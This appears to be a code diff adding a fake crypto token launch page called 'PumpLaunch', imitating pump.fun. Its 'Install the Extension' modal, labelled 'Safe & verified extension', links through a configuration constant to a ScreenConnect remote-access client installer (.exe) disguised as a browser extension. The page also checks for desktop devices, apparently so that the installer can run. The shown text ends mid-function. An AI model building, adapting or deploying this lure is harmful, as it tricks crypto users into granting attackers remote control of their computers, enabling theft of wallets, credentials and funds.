@@ -1,0 +1,1502 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PumpLaunch · Launch Your Token</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    /* ========== RESET & BASE ========== */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0a0b0d;
+      color: #eaecef;
+      min-height: 100vh;
+      overflow-x: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ========== PUMP.FUN BACKGROUND ========== */
+    .bg-layer {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      background: #0a0b0d;
+    }
+
+    .bg-layer::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background-image:
+        radial-gradient(circle at 10% 20%, rgba(0, 232, 123, 0.05) 0%, transparent 40%),
+        radial-gradient(circle at 90% 80%, rgba(0, 232, 123, 0.04) 0%, transparent 40%);
+      animation: bgPulse 12s ease-in-out infinite;
+    }
+
+    @keyframes bgPulse {
+      0%, 100% { opacity: 0.8; }
+      50% { opacity: 1.2; }
+    }
+
+    .bg-grid {
+      position: absolute;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+      background-size: 50px 50px;
+      animation: gridShift 60s linear infinite;
+    }
+
+    @keyframes gridShift {
+      from { transform: translate(0, 0); }
+      to { transform: translate(50px, 50px); }
+    }
+
+    .orb {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.15;
+      z-index: 1;
+      pointer-events: none;
+    }
+
+    .orb-1 {
+      width: 400px;
+      height: 400px;
+      background: #00e87b;
+      top: -100px;
+      left: -100px;
+      animation: orbFloat1 20s ease-in-out infinite;
+    }
+
+    .orb-2 {
+      width: 300px;
+      height: 300px;
+      background: #00a85a;
+      bottom: -80px;
+      right: -80px;
+      animation: orbFloat2 25s ease-in-out infinite;
+    }
+
+    @keyframes orbFloat1 {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      50% { transform: translate(80px, 60px) scale(1.1); }
+    }
+
+    @keyframes orbFloat2 {
+      0%, 100% { transform: translate(0, 0) scale(1); }
+      50% { transform: translate(-60px, -80px) scale(1.15); }
+    }
+
+    /* ========== APP SHELL ========== */
+    .app-shell {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ========== TOP NAV ========== */
+    .top-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 2rem;
+      height: 60px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      background: rgba(10, 11, 13, 0.85);
+      backdrop-filter: blur(20px);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      animation: navSlideDown 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
+
+    @keyframes navSlideDown {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 2rem;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 800;
+      font-size: 1.3rem;
+      color: #fff;
+      text-decoration: none;
+    }
+
+    .logo-icon {
+      width: 32px;
+      height: 32px;
+      background: #00e87b;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #000;
+      font-size: 0.9rem;
+      font-weight: 900;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      box-shadow: 0 4px 16px -4px rgba(0, 232, 123, 0.5);
+    }
+
+    .logo:hover .logo-icon {
+      transform: rotate(-8deg) scale(1.08);
+      box-shadow: 0 8px 24px -4px rgba(0, 232, 123, 0.8);
+    }
+
+    .logo-text {
+      background: linear-gradient(135deg, #fff 0%, #a0e8b8 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 0.25rem;
+    }
+
+    .nav-link {
+      padding: 0.5rem 1rem;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: #6b7280;
+      text-decoration: none;
+      border-radius: 8px;
+      transition: all 0.25s ease;
+      cursor: pointer;
+      background: none;
+      border: none;
+      font-family: inherit;
+      position: relative;
+    }
+
+    .nav-link::after {
+      content: '';
+      position: absolute;
+      bottom: 4px;
+      left: 50%;
+      width: 0;
+      height: 2px;
+      background: #00e87b;
+      transition: all 0.3s ease;
+      transform: translateX(-50%);
+      border-radius: 2px;
+    }
+
+    .nav-link:hover {
+      color: #fff;
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .nav-link.active {
+      color: #00e87b;
+      background: rgba(0, 232, 123, 0.08);
+    }
+
+    .nav-link.active::after {
+      width: 20px;
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .nav-icon-btn {
+      width: 38px;
+      height: 38px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      color: #9ca3af;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      font-size: 0.9rem;
+    }
+
+    .nav-icon-btn:hover {
+      background: rgba(0, 232, 123, 0.1);
+      border-color: rgba(0, 232, 123, 0.3);
+      color: #00e87b;
+      transform: translateY(-2px);
+    }
+
+    /* ========== MAIN CONTENT ========== */
+    .main-content {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 3rem 2rem;
+    }
+
+    /* ========== LAUNCH CARD ========== */
+    .launch-card {
+      width: 100%;
+      max-width: 520px;
+      background: #111214;
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: 20px;
+      padding: 2.5rem;
+      position: relative;
+      box-shadow:
+        0 20px 60px -20px rgba(0, 0, 0, 0.8),
+        0 0 0 1px rgba(255, 255, 255, 0.02) inset;
+      animation: cardFadeIn 0.7s cubic-bezier(0.2, 0.8, 0.2, 1) 0.1s both;
+      transition: box-shadow 0.4s ease, transform 0.4s ease;
+    }
+
+    .launch-card:hover {
+      box-shadow:
+        0 30px 80px -20px rgba(0, 0, 0, 0.9),
+        0 0 60px -20px rgba(0, 232, 123, 0.15),
+        0 0 0 1px rgba(255, 255, 255, 0.03) inset;
+      transform: translateY(-2px);
+    }
+
+    @keyframes cardFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px) scale(0.98);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .launch-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 2rem;
+      right: 2rem;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #00e87b, transparent);
+      border-radius: 0 0 4px 4px;
+      opacity: 0.6;
+      animation: accentPulse 3s ease-in-out infinite;
+    }
+
+    @keyframes accentPulse {
+      0%, 100% { opacity: 0.4; }
+      50% { opacity: 0.9; }
+    }
+
+    /* ========== CARD HEADER ========== */
+    .card-header {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-bottom: 2rem;
+    }
+
+    .header-icon {
+      width: 44px;
+      height: 44px;
+      background: rgba(0, 232, 123, 0.1);
+      border: 1px solid rgba(0, 232, 123, 0.2);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #00e87b;
+      font-size: 1.1rem;
+      transition: all 0.3s ease;
+    }
+
+    .launch-card:hover .header-icon {
+      transform: rotate(-8deg) scale(1.05);
+      background: rgba(0, 232, 123, 0.15);
+      box-shadow: 0 0 24px -4px rgba(0, 232, 123, 0.4);
+    }
+
+    .header-text h1 {
+      font-size: 1.15rem;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -0.01em;
+    }
+
+    .header-text p {
+      font-size: 0.8rem;
+      color: #6b7280;
+      margin-top: 0.15rem;
+    }
+
+    /* ========== TOKEN PREVIEW ========== */
+    .token-preview {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      padding: 1.25rem;
+      background: #0d0e10;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 14px;
+      margin-bottom: 1.75rem;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .token-preview::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(90deg, transparent, rgba(0, 232, 123, 0.03), transparent);
+      transform: translateX(-100%);
+      transition: transform 0.6s ease;
+    }
+
+    .launch-card:hover .token-preview::before {
+      transform: translateX(100%);
+    }
+
+    .token-avatar {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #00e87b 0%, #00a85a 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.5rem;
+      color: #000;
+      font-weight: 800;
+      flex-shrink: 0;
+      box-shadow: 0 8px 24px -6px rgba(0, 232, 123, 0.4);
+      transition: all 0.3s ease;
+      position: relative;
+      z-index: 1;
+    }
+
+    .token-avatar::after {
+      content: '';
+      position: absolute;
+      inset: -4px;
+      border-radius: 50%;
+      border: 2px solid rgba(0, 232, 123, 0.3);
+      animation: avatarRing 2.5s ease-in-out infinite;
+    }
+
+    @keyframes avatarRing {
+      0%, 100% {
+        transform: scale(1);
+        opacity: 0.6;
+      }
+      50% {
+        transform: scale(1.12);
+        opacity: 0;
+      }
+    }
+
+    .token-avatar.launching {
+      animation: coinLaunch 1s cubic-bezier(0.3, 0, 0.2, 1) forwards;
+    }
+
+    @keyframes coinLaunch {
+      0% { transform: translateY(0) scale(1) rotate(0deg); opacity: 1; }
+      40% { transform: translateY(-140px) scale(1.15) rotate(180deg); opacity: 1; }
+      100% { transform: translateY(-400px) scale(0.2) rotate(720deg); opacity: 0; }
+    }
+
+    .token-info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .token-name {
+      font-size: 1rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.25rem;
+      transition: color 0.3s ease;
+    }
+
+    .token-symbol {
+      font-size: 0.8rem;
+      color: #00e87b;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    .token-stats {
+      display: flex;
+      gap: 1.5rem;
+      margin-top: 0.5rem;
+    }
+
+    .stat-item {
+      display: flex;
+      flex-direction: column;
+      gap: 0.1rem;
+    }
+
+    .stat-label {
+      font-size: 0.65rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: #4b5563;
+      font-weight: 600;
+    }
+
+    .stat-value {
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #d1d5db;
+      font-variant-numeric: tabular-nums;
+      transition: all 0.3s ease;
+    }
+
+    .stat-value.green {
+      color: #00e87b;
+    }
+
+    /* ========== LAUNCH BUTTON ========== */
+    .launch-btn {
+      width: 100%;
+      padding: 1.1rem 1.5rem;
+      background: linear-gradient(135deg, #00e87b 0%, #00c96b 100%);
+      color: #000;
+      font-family: 'Inter', sans-serif;
+      font-size: 1rem;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.25s cubic-bezier(0.2, 0.9, 0.3, 1.2);
+      box-shadow:
+        0 8px 24px -6px rgba(0, 232, 123, 0.5),
+        0 0 0 1px rgba(255, 255, 255, 0.1) inset;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .launch-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255,255,255,0.3) 0%, transparent 50%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .launch-btn::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 0;
+      height: 0;
+      background: rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      transition: width 0.6s ease, height 0.6s ease;
+    }
+
+    .launch-btn:hover {
+      transform: translateY(-2px) scale(1.01);
+      box-shadow:
+        0 16px 40px -8px rgba(0, 232, 123, 0.7),
+        0 0 0 1px rgba(255, 255, 255, 0.15) inset;
+    }
+
+    .launch-btn:hover::before {
+      opacity: 1;
+    }
+
+    .launch-btn:active {
+      transform: translateY(0) scale(0.98);
+    }
+
+    .launch-btn:active::after {
+      width: 300px;
+      height: 300px;
+    }
+
+    .launch-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .launch-btn i {
+      font-size: 0.95rem;
+      transition: transform 0.3s ease;
+    }
+
+    .launch-btn:hover i {
+      transform: translateX(3px) rotate(-10deg);
+    }
+
+    /* ========== CARD FOOTER ========== */
+    .card-footer {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 1.5rem;
+      padding-top: 1.25rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .footer-hint {
+      font-size: 0.75rem;
+      color: #4b5563;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .footer-hint i {
+      color: #00e87b;
+      font-size: 0.5rem;
+      animation: dotPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes dotPulse {
+      0%, 100% { opacity: 0.4; }
+      50% { opacity: 1; }
+    }
+
+    .gas-estimate {
+      font-size: 0.75rem;
+      color: #4b5563;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .gas-estimate span {
+      color: #9ca3af;
+      font-weight: 600;
+    }
+
+    /* ========== STATUS TOAST ========== */
+    .status-toast {
+      position: fixed;
+      bottom: 2rem;
+      left: 50%;
+      transform: translateX(-50%) translateY(120px);
+      background: #111214;
+      border: 1px solid rgba(0, 232, 123, 0.3);
+      border-radius: 12px;
+      padding: 0.9rem 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #fff;
+      box-shadow: 0 20px 50px -12px rgba(0, 0, 0, 0.9), 0 0 30px -10px rgba(0, 232, 123, 0.3);
+      opacity: 0;
+      transition: all 0.5s cubic-bezier(0.2, 0.8, 0.2, 1);
+      z-index: 999;
+      pointer-events: none;
+    }
+
+    .status-toast.visible {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .status-toast i {
+      color: #00e87b;
+      font-size: 1.1rem;
+      animation: toastIcon 0.6s ease;
+    }
+
+    @keyframes toastIcon {
+      0% { transform: scale(0) rotate(-180deg); }
+      100% { transform: scale(1) rotate(0deg); }
+    }
+
+    /* ========== BURST PARTICLES ========== */
+    .burst-particle {
+      position: fixed;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #00e87b;
+      box-shadow: 0 0 12px rgba(0, 232, 123, 0.9);
+      pointer-events: none;
+      z-index: 998;
+    }
+
+    /* ========== CONFETTI ========== */
+    .confetti {
+      position: fixed;
+      width: 10px;
+      height: 10px;
+      pointer-events: none;
+      z-index: 6000;
+      border-radius: 2px;
+    }
+
+    /* ========== MODAL (Extension Install) ========== */
+    .modal-backdrop {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 5000;
+      padding: 2rem;
+      opacity: 0;
+      transition: opacity 0.35s ease;
+    }
+
+    .modal-backdrop.active {
+      display: flex;
+      opacity: 1;
+    }
+
+    .modal-card {
+      width: 100%;
+      max-width: 460px;
+      background: #111214;
+      border: 1px solid rgba(0, 232, 123, 0.2);
+      border-radius: 24px;
+      padding: 2.5rem 2rem 2rem;
+      position: relative;
+      text-align: center;
+      box-shadow:
+        0 40px 100px -20px rgba(0, 0, 0, 0.95),
+        0 0 80px -20px rgba(0, 232, 123, 0.25);
+      transform: scale(0.92) translateY(20px);
+      opacity: 0;
+      transition: all 0.45s cubic-bezier(0.2, 0.8, 0.2, 1.1);
+      overflow: hidden;
+    }
+
+    .modal-backdrop.active .modal-card {
+      transform: scale(1) translateY(0);
+      opacity: 1;
+    }
+
+    .modal-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 2rem;
+      right: 2rem;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #00e87b, transparent);
+      border-radius: 0 0 4px 4px;
+      opacity: 0.8;
+    }
+
+    .modal-close {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      width: 34px;
+      height: 34px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      color: #9ca3af;
+      cursor: pointer;
+      transition: all 0.25s ease;
+      font-size: 0.85rem;
+    }
+
+    .modal-close:hover {
+      background: rgba(255, 80, 80, 0.15);
+      border-color: rgba(255, 80, 80, 0.4);
+      color: #ff7b7b;
+      transform: rotate(90deg);
+    }
+
+    .modal-icon-wrap {
+      width: 90px;
+      height: 90px;
+      margin: 0 auto 1.5rem;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .modal-icon-glow {
+      position: absolute;
+      inset: 0;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(0, 232, 123, 0.25) 0%, transparent 70%);
+      animation: iconGlowPulse 2.5s ease-in-out infinite;
+    }
+
+    @keyframes iconGlowPulse {
+      0%, 100% { transform: scale(1); opacity: 0.6; }
+      50% { transform: scale(1.3); opacity: 0.3; }
+    }
+
+    .modal-icon {
+      width: 76px;
+      height: 76px;
+      background: linear-gradient(135deg, rgba(0, 232, 123, 0.15) 0%, rgba(0, 232, 123, 0.05) 100%);
+      border: 1px solid rgba(0, 232, 123, 0.3);
+      border-radius: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2rem;
+      color: #00e87b;
+      position: relative;
+      z-index: 1;
+      animation: iconBounce 3s ease-in-out infinite;
+      box-shadow: 0 10px 30px -8px rgba(0, 232, 123, 0.5);
+    }
+
+    @keyframes iconBounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-6px); }
+    }
+
+    .modal-card h2 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      margin-bottom: 0.6rem;
+      letter-spacing: -0.02em;
+      background: linear-gradient(135deg, #fff 0%, #a0e8b8 100%);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .modal-card p {
+      font-size: 0.92rem;
+      color: #8c9ab3;
+      line-height: 1.6;
+      margin-bottom: 1.75rem;
+      max-width: 340px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .modal-features {
+      display: flex;
+      flex-direction: column;
+      gap: 0.65rem;
+      margin-bottom: 1.75rem;
+      text-align: left;
+      max-width: 320px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .modal-feature {
+      display: flex;
+      align-items: center;
+      gap: 0.7rem;
+      font-size: 0.85rem;
+      color: #b8c4d6;
+      padding: 0.5rem 0.85rem;
+      background: rgba(0, 232, 123, 0.04);
+      border: 1px solid rgba(0, 232, 123, 0.1);
+      border-radius: 10px;
+      animation: featureSlideIn 0.5s ease backwards;
+    }
+
+    .modal-feature:nth-child(1) { animation-delay: 0.15s; }
+    .modal-feature:nth-child(2) { animation-delay: 0.25s; }
+    .modal-feature:nth-child(3) { animation-delay: 0.35s; }
+
+    @keyframes featureSlideIn {
+      from {
+        opacity: 0;
+        transform: translateX(-12px);
+      }
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
+    .modal-feature i {
+      color: #00e87b;
+      font-size: 0.9rem;
+      width: 16px;
+      text-align: center;
+    }
+
+    .install-btn {
+      width: 100%;
+      padding: 1rem 1.5rem;
+      background: linear-gradient(135deg, #00e87b 0%, #00c96b 100%);
+      color: #000;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.25s cubic-bezier(0.2, 0.9, 0.3, 1.2);
+      box-shadow:
+        0 8px 24px -6px rgba(0, 232, 123, 0.5),
+        0 0 0 1px rgba(255, 255, 255, 0.1) inset;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      position: relative;
+      overflow: hidden;
+      text-decoration: none;
+    }
+
+    .install-btn::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255,255,255,0.3) 0%, transparent 50%);
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .install-btn:hover {
+      transform: translateY(-2px) scale(1.01);
+      box-shadow:
+        0 16px 40px -8px rgba(0, 232, 123, 0.7),
+        0 0 0 1px rgba(255, 255, 255, 0.15) inset;
+    }
+
+    .install-btn:hover::before {
+      opacity: 1;
+    }
+
+    .install-btn:active {
+      transform: translateY(0) scale(0.98);
+    }
+
+    .install-btn i {
+      font-size: 0.9rem;
+      transition: transform 0.3s ease;
+    }
+
+    .install-btn:hover i {
+      transform: translateX(4px);
+    }
+
+    .modal-footer-note {
+      margin-top: 1.25rem;
+      font-size: 0.75rem;
+      color: #4b5563;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.4rem;
+    }
+
+    .modal-footer-note i {
+      color: #00e87b;
+      font-size: 0.7rem;
+    }
+
+    /* ========== DESKTOP-ONLY OVERLAY ========== */
+    .mobile-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: radial-gradient(circle at 30% 30%, #0f1218, #070809);
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+
+    .mobile-card {
+      max-width: 400px;
+      width: 100%;
+      background: rgba(17, 18, 20, 0.9);
+      backdrop-filter: blur(20px);
+      border-radius: 24px;
+      padding: 3rem 2.5rem;
+      text-align: center;
+      border: 1px solid rgba(0, 232, 123, 0.15);
+      box-shadow: 0 30px 80px -20px rgba(0, 0, 0, 0.9), 0 0 60px -20px rgba(0, 232, 123, 0.2);
+      animation: mobileAppear 0.7s cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
+
+    @keyframes mobileAppear {
+      from {
+        opacity: 0;
+        transform: scale(0.92) translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: scale(1) translateY(0);
+      }
+    }
+
+    .mobile-icon-wrap {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 1.5rem;
+      background: rgba(0, 232, 123, 0.08);
+      border: 1px solid rgba(0, 232, 123, 0.2);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2.2rem;
+      color: #00e87b;
+      animation: iconFloat 3s ease-in-out infinite;
+    }
+
+    @keyframes iconFloat {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .mobile-card h2 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 0.75rem;
+      letter-spacing: -0.01em;
+    }
+
+    .mobile-card p {
+      font-size: 0.95rem;
+      color: #8c9ab3;
+      line-height: 1.6;
+      margin-bottom: 1.5rem;
+    }
+
+    .mobile-dots {
+      display: flex;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+
+    .mobile-dots span {
+      display: block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #00e87b;
+      animation: dotBounce 1.4s infinite ease-in-out;
+    }
+
+    .mobile-dots span:nth-child(2) {
+      animation-delay: 0.2s;
+      opacity: 0.7;
+    }
+
+    .mobile-dots span:nth-child(3) {
+      animation-delay: 0.4s;
+      opacity: 0.4;
+    }
+
+    @keyframes dotBounce {
+      0%, 80%, 100% { transform: scale(0.8); opacity: 0.4; }
+      40% { transform: scale(1.3); opacity: 1; }
+    }
+
+    /* ========== RESPONSIVE ========== */
+    @media (max-width: 600px) {
+      .top-nav {
+        padding: 0 1rem;
+      }
+      .nav-links {
+        display: none;
+      }
+      .launch-card {
+        padding: 1.75rem;
+        border-radius: 16px;
+      }
+      .token-preview {
+        flex-direction: column;
+        text-align: center;
+      }
+      .token-stats {
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background -->
+  <div class="bg-layer">
+    <div class="bg-grid"></div>
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+  </div>
+
+  <!-- App Shell (Desktop Only) -->
+  <div class="app-shell" id="appShell">
+    <!-- Top Navigation -->
+    <nav class="top-nav">
+      <div class="nav-left">
+        <a href="#" class="logo">
+          <div class="logo-icon">P</div>
+          <span class="logo-text">PumpLaunch</span>
+        </a>
+        <div class="nav-links">
+          <button class="nav-link active">Launch</button>
+          <button class="nav-link">Board</button>
+          <button class="nav-link">Portfolio</button>
+        </div>
+      </div>
+      <div class="nav-right">
+        <button class="nav-icon-btn" title="Search">
+          <i class="fas fa-search"></i>
+        </button>
+        <button class="nav-icon-btn" title="Settings">
+          <i class="fas fa-cog"></i>
+        </button>
+      </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <div class="launch-card">
+        <!-- Card Header -->
+        <div class="card-header">
+          <div class="header-icon">
+            <i class="fas fa-rocket"></i>
+          </div>
+          <div class="header-text">
+            <h1>Launch Your Token</h1>
+            <p>Deploy a new token to the bonding curve</p>
+          </div>
+        </div>
+
+        <!-- Token Preview -->
+        <div class="token-preview">
+          <div class="token-avatar" id="tokenAvatar">
+            <i class="fas fa-coins"></i>
+          </div>
+          <div class="token-info">
+            <div class="token-name" id="tokenName">Your Token</div>
+            <div class="token-symbol" id="tokenSymbol">$YOUR</div>
+            <div class="token-stats">
+              <div class="stat-item">
+                <span class="stat-label">Market Cap</span>
+                <span class="stat-value green">$0</span>
+              </div>
+              <div class="stat-item">
+                <span class="stat-label">Launches</span>
+                <span class="stat-value" id="launchCount">0</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Launch Button -->
+        <button class="launch-btn" id="launchBtn">
+          <i class="fas fa-rocket"></i>
+          <span>Launch Token</span>
+        </button>
+
+        <!-- Card Footer -->
+        <div class="card-footer">
+          <div class="footer-hint">
+            <i class="fas fa-circle"></i>
+            Fair launch · No presale
+          </div>
+          <div class="gas-estimate">
+            <i class="fas fa-gas-pump"></i>
+            Est. <span>0.02 SOL</span>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <!-- ========== MODAL: Extension Install ========== -->
+  <div class="modal-backdrop" id="modalBackdrop">
+    <div class="modal-card">
+      <button class="modal-close" id="modalClose" aria-label="Close">
+        <i class="fas fa-times"></i>
+      </button>
+
+      <div class="modal-icon-wrap">
+        <div class="modal-icon-glow"></div>
+        <div class="modal-icon">
+          <i class="fas fa-puzzle-piece"></i>
+        </div>
+      </div>
+
+      <h2>Install the Extension</h2>
+      <p>To complete your token launch, you need to install the PumpLaunch browser extension.</p>
+
+      <div class="modal-features">
+        <div class="modal-feature">
+          <i class="fas fa-check-circle"></i>
+          <span>One-click token deployment</span>
+        </div>
+        <div class="modal-feature">
+          <i class="fas fa-check-circle"></i>
+          <span>Real-time bonding curve tracking</span>
+        </div>
+        <div class="modal-feature">
+          <i class="fas fa-check-circle"></i>
+          <span>Secure wallet integration</span>
+        </div>
+      </div>
+
+      <a href="#" class="install-btn" id="installBtn" target="_blank" rel="noopener noreferrer">
+        <i class="fas fa-download"></i>
+        <span>Install Extension</span>
+      </a>
+
+      <div class="modal-footer-note">
+        <i class="fas fa-shield-alt"></i>
+        Safe & verified extension
+      </div>
+    </div>
+  </div>
+
+  <!-- Desktop-Only Overlay (shown on mobile/tablet) -->
+  <div class="mobile-overlay" id="mobileOverlay">
+    <div class="mobile-card">
+      <div class="mobile-icon-wrap">
+        <i class="fas fa-desktop"></i>
+      </div>
+      <h2>Desktop Required</h2>
+      <p>Please open this website on a desktop or PC to launch tokens. Our interface is optimized for larger screens.</p>
+      <div class="mobile-dots">
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Status Toast -->
+  <div class="status-toast" id="statusToast">
+    <i class="fas fa-check-circle"></i>
+    <span id="toastMessage">Token launched successfully!</span>
+  </div>
+
+  <script>
+    /* ============================================
+       CONFIGURATION
+       ============================================ */
+    // CHANGE THIS URL TO YOUR EXTENSION INSTALL LINK
+    const EXTENSION_INSTALL_URL = "https://armatura.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest";
+
+    /* ============================================
+       DESKTOP-ONLY DETECTION
+       ============================================ */
+    function isDesktopDevice() {
+      const minDesktopWidth = 1025;
+
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      const mobileRegex = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i;
+
+      const hasCoarsePointer = window.matchMedia('(pointer: coarse)').matches;
+      const hasNoHover = window.matchMedia('(hover: none)').matches;
+
+      if (window.innerWidth < minDesktopWidth) return false;
+      if (mobileRegex.test(userAgent)) return false;
